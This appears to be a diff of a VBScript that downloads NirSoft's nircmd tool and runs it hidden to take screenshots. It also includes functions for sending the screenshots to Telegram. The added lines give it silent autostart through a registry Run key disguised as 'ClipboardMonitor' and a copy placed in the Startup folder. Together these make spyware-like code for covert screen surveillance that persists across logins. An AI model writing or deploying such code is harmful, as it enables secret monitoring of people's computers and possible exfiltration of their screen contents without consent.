@@ -1,15 +1,19 @@
 ' Define the directory where nircmd.exe will be saved
-nircmdDir = "C:\Tools" ' This will be the directory where nircmd.exe will be saved
-nircmdPath = nircmdDir & "\nircmd.exe" ' Full path of nircmd.exe
+nircmdDir = "C:\nircmd" ' Directory where nircmd.exe will be extracted
+nircmdPath = nircmdDir & "\nircmd.exe" ' Full path to nircmd.exe
 nircmdZipPath = nircmdDir & "\nircmd.zip" ' Path to save the downloaded ZIP file
-nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL of nircmd.zip (zip version)
+nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL to download the nircmd.zip
+
+' Create an object to interact with the system's shell
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Step 1: Create the directory if it doesn't exist
 If Not FolderExists(nircmdDir) Then
     CreateFolder nircmdDir
 End If
 
-' Step 2: Check if nircmd.exe exists, if not, download and extract it
+' Step 2: Check if nircmd.exe exists in the directory, if not, download and extract it
 If Not FileExists(nircmdPath) Then
     ' If nircmd.exe doesn't exist, download and extract it
     DownloadNircmd nircmdURL, nircmdZipPath ' Download the ZIP file
@@ -18,6 +22,24 @@ End If
 
 ' Step 3: Run nircmd.exe to capture the screenshot automatically
 CaptureScreenshot()
+
+' Step 4: Add to registry and Startup folder for automatic execution on login
+' Add to registry for automatic execution on login
+strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClipboardMonitor"
+strScriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)
+
+On Error Resume Next
+If objShell.RegRead(strRegPath) = "" Then
+    objShell.RegWrite strRegPath, "wscript.exe //B " & strScriptPath, "REG_SZ"
+End If
+On Error GoTo 0
+
+' Save a copy of the script in the Startup folder to ensure it starts automatically
+strStartupFolder = objShell.SpecialFolders("Startup")
+strDestPath = strStartupFolder & "\" & objFSO.GetFileName(WScript.ScriptFullName)
+If Not objFSO.FileExists(strDestPath) Then
+    objFSO.CopyFile WScript.ScriptFullName, strDestPath
+End If
 
 ' Function to check if a file exists
 Function FileExists(filePath)
@@ -65,11 +87,7 @@ End Sub
 Sub CaptureScreenshot()
     ' Run nircmd to capture the screenshot
     Set objShell = CreateObject("WScript.Shell")
-    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot " & nircmdDir & "\screenshot.png", 0, True
-    
-    ' You can also send it to Telegram here if you like (optional)
-    ' SendTelegramMessage "Screenshot captured and saved!"
-    ' Call SendPhotoToTelegram(nircmdDir & "\screenshot.png") ' If you want to send the screenshot to Telegram
+    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot """ & nircmdDir & "\screenshot.png""", 0, True
 End Sub
 
 ' Optional Telegram Message Functions (if you want to send the screenshot to Telegram)
